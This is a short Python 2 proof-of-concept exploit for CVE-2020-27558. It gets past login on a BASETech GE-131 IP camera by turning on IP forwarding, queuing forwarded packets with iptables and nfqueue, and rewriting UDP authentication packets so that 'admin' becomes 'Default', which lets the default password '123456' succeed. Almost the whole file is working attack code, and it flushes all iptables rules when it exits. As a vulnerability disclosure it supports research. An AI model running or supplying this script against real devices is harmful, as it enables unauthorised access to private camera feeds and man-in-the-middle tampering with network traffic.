#!/usr/bin/python2
#
# CVE-2020-27558 PoC 
# Allows you to authenticate to a BASETech GE-131 BT-1837836
# IP camera without knowing the password.
# Waits for authentication requests on the wire and replaces
# "admin" with "Default". Filter is rather broad but works
# reasonably well for a PoC.
# Enter the password "123456" in the mobile App, since that
# is the password of the Default user and is not adjusted by
# the PoC script.
#
# Based on: https://gist.github.com/eXenon/85a3eab09fefbb3bee5d

import nfqueue
from scapy.all import *
import os

print("Adding MITM settings")
os.system("iptables -A FORWARD -j NFQUEUE")
os.system("sysctl -q net.ipv4.ip_forward=1")

def callback(dummy, payload):
    data = payload.get_data()
    pkt = IP(data)
    # Fiter for UDP, with Raw and string 'admin' in payload
    if UDP in pkt and Raw in pkt and 'admin' in pkt[Raw].load:
        print("Authentication packet detected, manipulating...")
        # Replace admin with Default, for padding remove 2 zero bytes
        pkt[Raw].load = pkt[Raw].load.replace('admin\x00\x00', 'Default') 
        # Remove all checksums and lengths, they will get recalculated automatically 
        del pkt[IP].chksum
        del pkt[UDP].chksum
        del pkt[UDP].len
        del pkt[IP].len
        payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
        print("Done!")
    else:
        payload.set_verdict(nfqueue.NF_ACCEPT)

def main():
    q = nfqueue.queue()
    q.open()
    q.bind(socket.AF_INET)
    q.set_callback(callback)
    q.create_queue(0)
    print("Waiting for authentication packet...")
    try:
        q.try_run() # Main loop
    except KeyboardInterrupt:
        q.unbind(socket.AF_INET)
        q.close()
        print("Flushing iptables.")
        # This flushes everything, you might wanna be careful
        os.system('iptables -F')
        os.system('iptables -X')

if __name__ == "__main__":
    main()
